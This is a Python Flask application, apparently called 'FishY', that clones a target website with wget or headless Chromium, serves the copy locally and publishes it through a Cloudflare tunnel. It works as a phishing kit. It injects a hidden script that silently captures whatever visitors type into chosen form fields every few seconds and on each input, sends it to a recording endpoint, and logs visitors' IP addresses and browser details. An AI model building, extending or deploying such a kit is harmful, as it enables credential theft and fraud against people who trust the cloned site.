#!/usr/bin/env python3
import os
import re
import sys
import json
import time
import shutil
import signal
import socket
import atexit
import threading
import subprocess
from pathlib import Path
from http.server import HTTPServer, SimpleHTTPRequestHandler
import urllib.request
from urllib.parse import urlparse

import hashlib
import mimetypes
from urllib.parse import urljoin

from flask import Flask, render_template, request, jsonify, Response

app = Flask(__name__)

BASE_DIR = Path(__file__).resolve().parent
CLONE_DIR = BASE_DIR / 'cloned_site'
PROGRESS_FILE = BASE_DIR / 'progress.log'

wget_process = None
clone_http_server = None
clone_http_thread = None
is_cloning = False
is_cloned = False
clone_port = None
clone_url_result = None
publish_process = None
publish_url = None
_lock = threading.Lock()


def cleanup():
    global wget_process, clone_http_server, clone_http_thread, is_cloning, is_cloned, clone_port, clone_url_result, recorded_data, _last_visitor, publish_process, publish_url

    if publish_process:
        try:
            publish_process.kill()
        except Exception:
            pass
        publish_process = None

    if wget_process:
        try:
            wget_process.terminate()
            wget_process.wait(timeout=3)
        except Exception:
            try:
                wget_process.kill()
            except Exception:
                pass
        wget_process = None

    publish_url = None

    if clone_http_server:
        try:
            clone_http_server.shutdown()
        except Exception:
            pass
        clone_http_server = None

    if clone_http_thread and clone_http_thread.is_alive():
        clone_http_thread = None

    for p in [CLONE_DIR, PROGRESS_FILE]:
        if p.exists():
            try:
                if p.is_dir():
                    shutil.rmtree(p, ignore_errors=True)
                else:
                    p.unlink(missing_ok=True)
            except Exception:
                pass

    is_cloning = False
    is_cloned = False
    clone_port = None
    clone_url_result = None
    with recorded_lock:
        recorded_data.clear()
    _last_visitor.clear()
    if CLONE_DIR.exists():
        for sub in CLONE_DIR.iterdir():
            if sub.is_dir():
                vf = sub / '_visitors.jsonl'
                if vf.exists():
                    try:
                        vf.unlink()
                    except Exception:
                        pass


def signal_handler(signum, frame):
    cleanup()
    sys.exit(0)


atexit.register(cleanup)
signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)


def find_free_port():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('', 0))
        return s.getsockname()[1]


_last_visitor = {}


class CloneHTTPHandler(SimpleHTTPRequestHandler):
    def __init__(self, *args, directory=None, **kwargs):
        self.clone_dir = directory
        super().__init__(*args, directory=directory, **kwargs)

    def log_visitor(self):
        global _last_visitor
        try:
            p = self.path
            if p != '/' and not p.endswith('.html'):
                return
            ip = self.client_address[0]
            ua = self.headers.get('User-Agent', '')
            ref = self.headers.get('Referer', '')
            lang = self.headers.get('Accept-Language', '')
            now = time.time()
            key = f'{ip}|{ua}'
            last = _last_visitor.get(key, 0)
            if now - last < 5:
                return
            _last_visitor[key] = now
            visitors_file = Path(self.clone_dir) / '_visitors.jsonl'
            with open(visitors_file, 'a') as f:
                f.write(json.dumps({'ip': ip, 'ua': ua, 'path': p, 'ref': ref, 'lang': lang, 't': now}) + '\n')
        except Exception:
            pass

    def do_GET(self):
        self.log_visitor()
        super().do_GET()

    def do_POST(self):
        if self.path == '/api/record':
            try:
                length = int(self.headers.get('Content-Length', 0))
                body = self.rfile.read(length) if length else b'{}'
                data = json.loads(body)
                with recorded_lock:
                    recorded_data.update(data)
            except Exception:
                pass
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(b'{"status":"ok"}')
        else:
            super().do_POST()

    def log_message(self, fmt, *args):
        pass

    def send_error(self, code, message=None):
        if code == 404:
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.end_headers()
            self.wfile.write(b'<html><body style="font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;background:#0a0a1a;color:#e0e0ff"><div style="text-align:center"><h1>Cloned Page</h1><p>The requested page was not found in the clone.</p><p style="color:#888;font-size:14px">Only successfully downloaded files are available.</p></div></body></html>')
        else:
            super().send_error(code, message)


def start_clone_http_server(directory):
    global clone_http_server, clone_http_thread

    port = find_free_port()

    handler = lambda *args, **kwargs: CloneHTTPHandler(*args, directory=str(directory), **kwargs)
    server = HTTPServer(('0.0.0.0', port), handler)
    server.timeout = 0.5

    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()

    clone_http_server = server
    clone_http_thread = thread
    return port


def write_progress(**kwargs):
    try:
        with open(PROGRESS_FILE, 'a') as f:
            f.write(json.dumps(kwargs) + '\n')
            f.flush()
    except Exception:
        pass


def scan_page_for_cdn_domains(url, main_domain):
    import ssl
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.Request(url, headers={
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36'
        })
        html = urllib.request.urlopen(req, timeout=15, context=ctx).read()
        html = html.decode('utf-8', errors='replace')

        domains = set()

        def add(d):
            if d and d != main_domain:
                domains.add(d)

        # scan for external assets so we can grab them too
        for q in ['"', "'"]:
            for m in re.finditer(rf'<script[^>]+src={q}(https?://([^{q}/]+)[^{q}]*){q}', html, re.IGNORECASE):
                add(m.group(2))
            for m in re.finditer(rf'<script[^>]+src={q}(//([^{q}/]+)[^{q}]*){q}', html, re.IGNORECASE):
                add(m.group(2))

        # <link> stylesheets/preloads etc
        for q in ['"', "'"]:
            for m in re.finditer(rf'<link[^>]+href={q}(https?://([^{q}/]+)[^{q}]*){q}', html, re.IGNORECASE):
                tag = m.group(0).lower()
                if any(r in tag for r in ['stylesheet', 'preload', 'prefetch', 'modulepreload', 'dns-prefetch', 'preconnect', 'icon', 'apple-touch', 'manifest', 'alternate']):
                    add(m.group(2))
            for m in re.finditer(rf'<link[^>]+href={q}(//([^{q}/]+)[^{q}]*){q}', html, re.IGNORECASE):
                tag = m.group(0).lower()
                if any(r in tag for r in ['stylesheet', 'preload', 'prefetch', 'modulepreload', 'dns-prefetch', 'preconnect', 'icon', 'apple-touch', 'manifest', 'alternate']):
                    add(m.group(2))

        # img, video, iframe, etc with lazy-load attrs
        for tag_name in ['img', 'source', 'video', 'audio', 'iframe', 'embed', 'track', 'object']:
            attrs = '|'.join(['src', 'data-src', 'data-lazy', 'data-original', 'data-href', 'data-url'])
            for q in ['"', "'"]:
                for m in re.finditer(rf'<{tag_name}[^>]+(?:{attrs})={q}(https?://([^{q}/]+)[^{q}]*){q}', html, re.IGNORECASE):
                    add(m.group(2))
                for m in re.finditer(rf'<{tag_name}[^>]+(?:{attrs})={q}(//([^{q}/]+)[^{q}]*){q}', html, re.IGNORECASE):
                    add(m.group(2))

        for m in re.finditer(r'srcset="([^"]+)"', html, re.IGNORECASE):
            for part in m.group(1).split(','):
                p = part.strip().split()[0]
                if not p: continue
                if p.startswith(('http://', 'https://')):
                    add(urlparse(p).netloc)
                elif p.startswith('//'):
                    add(urlparse('https:' + p).netloc)

        for m in re.finditer(r'@import\s+[\'\"](https?://[^\'\"]+)[\'\"]', html, re.IGNORECASE):
            add(urlparse(m.group(1)).netloc)
        for m in re.finditer(r'@import\s+[\'\"]//([^\'\"]+)[\'\"]', html, re.IGNORECASE):
            add(urlparse('https:' + m.group(1)).netloc)

        for m in re.finditer(r'url\([\'\"]?(https?://[^\'\"\)]+)[\'\"]?\)', html, re.IGNORECASE):
            add(urlparse(m.group(1)).netloc)
        for m in re.finditer(r'url\([\'\"]?(//[^\'\"\)]+)[\'\"]?\)', html, re.IGNORECASE):
            add(urlparse('https:' + m.group(1)).netloc)

        for m in re.finditer(r'<meta[^>]+http-equiv=["\']Content-Security-Policy["\'][^>]+content=["\']([^"\']+)', html, re.IGNORECASE):
            for directive in m.group(1).split(';'):
                parts = directive.strip().split()
                for p in parts[1:]:
                    if p.startswith(('http://', 'https://')):
                        add(urlparse(p).netloc)

        # ditch the usual tracker crap
        blocked_prefixes = [
            'facebook', 'twitter', 'linkedin', 'instagram', 'youtube',
            'google-analytics', 'googletagmanager', 'doubleclick',
            'googleapis.com', 'googlesyndication', 'googleadservices',
            't.co', 'bit.ly', 'optimizely', 'hotjar', 'crazyegg',
        ]
        safe = sorted(d for d in domains if not any(x in d for x in blocked_prefixes))
        return safe
    except Exception as e:
        return []


def run_clone_wget(url, domain):
    write_progress(type='status', value='starting', message='Scanning for external resources...')

    cdn_domains = scan_page_for_cdn_domains(url, domain)
    if cdn_domains:
        write_progress(type='log', line=f'Found CDN domains: {", ".join(cdn_domains)}')

    cmd = [
        'wget',
        '--mirror',
        '--page-requisites',
        '--convert-links',
        '--no-parent',
        '-e', 'robots=off',
        '--wait=0',
        '--timeout=10',
        '--tries=2',
        '--no-verbose',
        '--adjust-extension',
        '--content-disposition',
        '--no-if-modified-since',
        '--no-cache',
        '--max-redirect=5',
        '--reject-regex', r'cdn-cgi/image/width=',
        '--user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        '--progress=bar:force:noscroll',
        '--directory-prefix', str(CLONE_DIR),
    ]

    if cdn_domains:
        cmd.extend(['--span-hosts', '--domains', ','.join([domain] + cdn_domains)])
        write_progress(type='log', line=f'[wget] CDN domains: {", ".join(cdn_domains)}')

    cmd.append(url)

    global wget_process
    process = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1
    )
    wget_process = process

    for line in process.stdout:
        m = re.search(r'(\d{1,3})\s*%', line)
        pct = int(m.group(1)) if m else None
        write_progress(type='log', line=line.rstrip('\n'), percent=pct)

    rc = process.wait()
    wget_process = None

    if rc == 0:
        clone_path = CLONE_DIR / domain
        if clone_path.exists():
            return clone_path
        else:
            write_progress(type='status', value='error', message=f'Clone directory not found at {clone_path}')
            return None
    else:
        write_progress(type='status', value='error', message=f'wget exited with code {rc}')
        return None


def run_clone_playwright(url, domain, fields=None):
    from playwright.sync_api import sync_playwright

    clone_path = CLONE_DIR / domain
    clone_path.mkdir(parents=True, exist_ok=True)

    write_progress(type='log', line='[playwright] Launching headless Chromium...')

    responses = []
    seen_urls = set()

    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        context = browser.new_context(
            user_agent='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
            viewport={'width': 1920, 'height': 1080},
            locale='en-US',
        )
        page = context.new_page()

        def on_response(response):
            if response.status != 200:
                return
            resp_url = response.url
            if resp_url in seen_urls:
                return
            seen_urls.add(resp_url)

            ct = (response.headers.get('content-type') or '').lower()
            if not any(t in ct for t in ['text/html', 'text/css',
                                          'application/javascript',
                                          'application/x-javascript',
                                          'text/javascript',
                                          'image/', 'font/', 'application/json',
                                          'application/font']):
                return

            body = response.body()
            responses.append({
                'url': resp_url,
                'content_type': ct,
                'body': body,
            })

        page.on('response', on_response)

        write_progress(type='log', line=f'[playwright] Loading {url}...')
        page.goto(url, wait_until='networkidle', timeout=60000)
        page.wait_for_timeout(3000)

        field_data = {}
        if fields:
            write_progress(type='log', line=f'[playwright] Extracting {len(fields)} fields...')
            for f in fields:
                try:
                    js_selector = json.dumps(f['selector'])
                    js = (
                        '() => {'
                        '  const els = document.querySelectorAll(' + js_selector + ');'
                        '  return Array.from(els).map(el => {'
                        "    const tag = el.tagName;"
                        "    if (tag === 'INPUT' || tag === 'TEXTAREA' || tag === 'SELECT') return el.value || '';"
                        "    if (tag === 'IMG') return el.src;"
                        "    if (tag === 'A') return el.href;"
                        "    if (el.hasAttribute('data-value')) return el.getAttribute('data-value');"
                        '    return el.textContent || el.innerText || "";'
                        '  });'
                        '}'
                    )
                    values = page.evaluate(js)
                    field_data[f['name']] = {'selector': f['selector'], 'values': values}
                    write_progress(type='log', line=f'  [field] {f["name"]}: {len(values)} result(s)')
                except Exception as fe:
                    write_progress(type='log', line=f'  [field] {f["name"]}: error - {fe}')

        rendered_html = page.content()
        page.close()
        browser.close()

    write_progress(type='log', line=f'[playwright] Captured {len(responses)} assets')

    url_to_path = {}
    index_saved = False

    for resp in responses:
        resp_url = resp['url']
        body = resp['body']
        ct = resp['content_type']

        up = urlparse(resp_url)

        if 'html' in ct and (up.path in ('', '/') or not index_saved):
            fpath = clone_path / 'index.html'
            fpath.write_text(body.decode('utf-8', errors='replace'))
            url_to_path[resp_url] = fpath
            index_saved = True
        else:
            ext = Path(up.path).suffix or mimetypes.guess_extension(ct.split(';')[0].strip()) or '.bin'
            name = hashlib.md5(resp_url.encode()).hexdigest()[:12]
            local = clone_path / 'assets' / f'{name}{ext}'
            local.parent.mkdir(parents=True, exist_ok=True)
            local.write_bytes(body)
            url_to_path[resp_url] = local

    if not index_saved:
        fpath = clone_path / 'index.html'
        fpath.write_text(rendered_html, encoding='utf-8')
        url_to_path[url] = fpath

    html = fpath.read_text(encoding='utf-8')

    def _rewrite_one(original):
        absolute = urljoin(url, original)
        local = url_to_path.get(absolute)
        if local:
            return '/' + os.path.relpath(str(local), str(clone_path)).replace(os.sep, '/')
        return None

    def replace_src_href(m):
        attr, original = m.group(1), m.group(2)
        rel = _rewrite_one(original)
        if rel:
            return f'{attr}="{rel}"'
        return m.group(0)

    def replace_css_url(m):
        original = m.group(1)
        rel = _rewrite_one(original)
        if rel:
            return f'url("{rel}")'
        return m.group(0)

    html = re.sub(r'(src|href)="([^"]*)"', replace_src_href, html)
    html = re.sub(r"url\('([^']+)'\)", replace_css_url, html)
    html = re.sub(r'url\("([^"]+)"\)', replace_css_url, html)

    if fields:
        selectors_json = json.dumps([{'name': f['name'], 'selector': f['selector']} for f in fields])
        recorder_script = f'''
<script>
(function(){{
  const FIELDS = {selectors_json};

  function collect() {{
    const data = {{}};
    for (const f of FIELDS) {{
      try {{
        const els = document.querySelectorAll(f.selector);
        data[f.name] = Array.from(els).map(el => {{
          const t = el.tagName;
          if (t==='INPUT'||t==='TEXTAREA'||t==='SELECT') return el.value||'';
          if (t==='IMG') return el.src;
          if (t==='A') return el.href;
          return el.textContent||el.innerText||'';
        }});
      }} catch(e) {{ data[f.name] = ['err: '+e.message]; }}
    }}
    return data;
  }}

  let lastSent = '';

  async function send() {{
    const data = collect();
    const s = JSON.stringify(data);
    if (s === lastSent) return;
    lastSent = s;
    try {{
      await fetch('/api/record', {{ method:'POST', headers:{{'Content-Type':'application/json'}}, body:s }});
    }} catch(e) {{}}
  }}

  // attach listeners so we catch input/change events
  function attachListeners() {{
    for (const f of FIELDS) {{
      try {{
        const els = document.querySelectorAll(f.selector);
        for (const el of els) {{
          el.addEventListener('input', send);
          el.addEventListener('change', send);
        }}
      }} catch(e) {{}}
    }}
  }}
  attachListeners();

  // Silent background recording every 2.5s (only sends when data changes)
  setInterval(send, 2500);

  // Send once on load for initial values
  setTimeout(send, 1000);
}})();
</script>'''
        html = html.replace('</body>', recorder_script + '\n</body>')

    fpath.write_text(html, encoding='utf-8')

    if field_data:
        fields_path = clone_path / '_fields.json'
        fields_path.write_text(json.dumps(field_data, indent=2), encoding='utf-8')
        write_progress(type='log', line=f'[playwright] Saved field data: {", ".join(field_data.keys())}')

    write_progress(type='log', line=f'[playwright] Clone saved to {clone_path}')
    return clone_path


def run_clone(url, use_playwright=False, fields=None):
    global wget_process, is_cloning, is_cloned, clone_port, clone_url_result, publish_process, publish_url

    # kill any existing tunnel before starting a new clone
    if publish_process:
        try:
            publish_process.kill()
        except Exception:
            pass
        publish_process = None
    publish_url = None

    with _lock:
        is_cloning = True
        is_cloned = False
        clone_port = None
        clone_url_result = None

    try:
        if CLONE_DIR.exists():
            shutil.rmtree(CLONE_DIR, ignore_errors=True)
        CLONE_DIR.mkdir(parents=True, exist_ok=True)

        PROGRESS_FILE.write_text('', encoding='utf-8')

        parsed = urlparse(url)
        domain = parsed.netloc

        if use_playwright:
            clone_path = run_clone_playwright(url, domain, fields=fields)
        else:
            clone_path = run_clone_wget(url, domain)

        if clone_path and clone_path.exists():
            port = start_clone_http_server(clone_path)
            clone_port = port
            clone_url_result = f'http://127.0.0.1:{port}'

            with _lock:
                is_cloned = True

            write_progress(type='status', value='completed', message='Clone complete!', clone_url=clone_url_result)
        else:
            if clone_path is None:
                pass
            else:
                write_progress(type='status', value='error', message=f'Clone directory not found at {clone_path}')

    except Exception as e:
        write_progress(type='status', value='error', message=str(e))
    finally:
        with _lock:
            is_cloning = False


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/api/clone', methods=['POST'])
def api_clone():
    with _lock:
        if is_cloning:
            return jsonify({'error': 'A clone is already in progress'}), 409

    data = request.get_json()
    url = data.get('url', '').strip()
    use_playwright = data.get('mode') == 'playwright'
    raw_fields = data.get('fields', '')

    fields = None
    if raw_fields and use_playwright:
        fields = []
        for line in raw_fields.strip().split('\n'):
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            if ':' in line:
                name, selector = line.split(':', 1)
                fields.append({'name': name.strip(), 'selector': selector.strip()})

    if not url:
        return jsonify({'error': 'URL is required'}), 400

    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url

    parsed = urlparse(url)
    if not parsed.netloc:
        return jsonify({'error': 'Invalid URL'}), 400

    thread = threading.Thread(target=run_clone, args=(url,), kwargs={'use_playwright': use_playwright, 'fields': fields}, daemon=True)
    thread.start()

    return jsonify({'status': 'started', 'url': url, 'mode': 'playwright' if use_playwright else 'wget'})


@app.route('/api/progress')
def api_progress():
    def generate():
        last_pos = 0
        try:
            while True:
                try:
                    if PROGRESS_FILE.exists():
                        sz = PROGRESS_FILE.stat().st_size
                        if sz > last_pos:
                            with open(PROGRESS_FILE, 'r') as f:
                                f.seek(last_pos)
                                new_data = f.read()
                                last_pos = f.tell()

                            for line in new_data.strip().split('\n'):
                                if line:
                                    yield f'data: {line}\n\n'

                        with _lock:
                            done = is_cloned or (not is_cloning and not is_cloned)

                        yield f'data: {json.dumps({"type": "heartbeat"})}\n\n'

                        if done:
                            break
                except Exception:
                    yield f'data: {json.dumps({"type": "heartbeat"})}\n\n'

                time.sleep(0.25)
        except GeneratorExit:
            pass

    return Response(generate(), mimetype='text/event-stream', headers={
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'X-Accel-Buffering': 'no',
    })


recorded_data = {}
recorded_lock = threading.Lock()


@app.route('/api/visitors')
def api_visitors():
    visitors = []
    for sub in CLONE_DIR.iterdir():
        if sub.is_dir():
            f = sub / '_visitors.jsonl'
            if f.exists():
                try:
                    for line in f.read_text().strip().split('\n'):
                        if line:
                            visitors.append(json.loads(line))
                except Exception:
                    pass
    visitors.reverse()
    return jsonify(visitors)


@app.route('/api/record', methods=['POST'])
def api_record():
    global recorded_data
    data = request.get_json(silent=True) or {}
    with recorded_lock:
        recorded_data.update(data)
    return jsonify({'status': 'ok'})


@app.route('/api/recorded')
def api_recorded():
    with recorded_lock:
        return jsonify(recorded_data)


@app.route('/api/fields')
def api_fields():
    for sub in CLONE_DIR.iterdir():
        if sub.is_dir():
            f = sub / '_fields.json'
            if f.exists():
                try:
                    return jsonify(json.loads(f.read_text()))
                except Exception:
                    return jsonify({})
    return jsonify({})


@app.route('/api/cleanup', methods=['POST'])
def api_cleanup():
    threading.Thread(target=cleanup, daemon=True).start()
    return jsonify({'status': 'cleaned'})


@app.route('/api/status')
def api_status():
    with _lock:
        return jsonify({
            'is_cloning': is_cloning,
            'is_cloned': is_cloned,
            'clone_url': clone_url_result,
            'publish_url': publish_url,
        })


@app.route('/api/publish')
def api_publish():
    global publish_process, publish_url
    with _lock:
        if not clone_port:
            return jsonify({'error': 'No clone server running'}), 400
        if publish_process and publish_process.poll() is None:
            if publish_url:
                return jsonify({'url': publish_url})
            return jsonify({'status': 'starting'})
    cloudflared_path = shutil.which('cloudflared') or os.path.expanduser('~/.local/bin/cloudflared')
    if not os.path.isfile(cloudflared_path):
        return jsonify({'error': 'cloudflared not installed. Install it: https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/'}), 400
    def run_tunnel():
        global publish_process, publish_url
        proc = subprocess.Popen(
            [cloudflared_path, 'tunnel', '--url', f'http://127.0.0.1:{clone_port}', '--no-autoupdate'],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
        )
        publish_process = proc
        for line in proc.stdout:
            m = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
            if m:
                publish_url = m.group(0)
                break
    thread = threading.Thread(target=run_tunnel, daemon=True)
    thread.start()
    return jsonify({'status': 'starting'})


@app.route('/api/unpublish', methods=['POST'])
def api_unpublish():
    global publish_process, publish_url
    if publish_process:
        try:
            publish_process.kill()
        except Exception:
            pass
        publish_process = None
    publish_url = None
    return jsonify({'status': 'unpublished'})


def run_server(port, host='0.0.0.0'):
    app.run(host=host, port=port, debug=False, threaded=True)


if __name__ == '__main__':
    if not shutil.which('wget'):
        print('\n  Error: wget is not installed.')
        print('  Install it:\n')
        print('    Ubuntu/Debian: sudo apt install wget')
        print('    macOS:          brew install wget')
        print('    Fedora:         sudo dnf install wget\n')
        sys.exit(1)

    port = int(os.environ.get('PORT', 5000))
    print(f'''
  \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557
  \u2551          \U0001f41f  FishY  v1.0              \u2551
  \u2551    Pixel-Perfect Website Cloner          \u2551
  \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d

  \u2500\u2500 Server \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
     URL:  http://127.0.0.1:{port}
     Ctrl+C to stop and auto-cleanup

  \u2500\u2500 Requirements \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
     Python 3.8+  |  wget  |  Flask
  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
''')

    run_server(port)
